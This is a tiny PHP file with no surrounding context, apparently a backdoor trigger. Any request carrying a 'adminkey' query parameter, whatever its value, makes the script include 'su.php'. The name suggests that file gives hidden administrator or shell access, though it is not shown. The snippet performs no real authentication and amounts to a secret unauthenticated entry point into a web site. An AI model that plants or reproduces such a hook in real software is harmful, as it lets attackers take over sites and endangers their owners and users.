<?php
if(isset($_GET['adminkey'])) {
  include("su.php");
}
?>
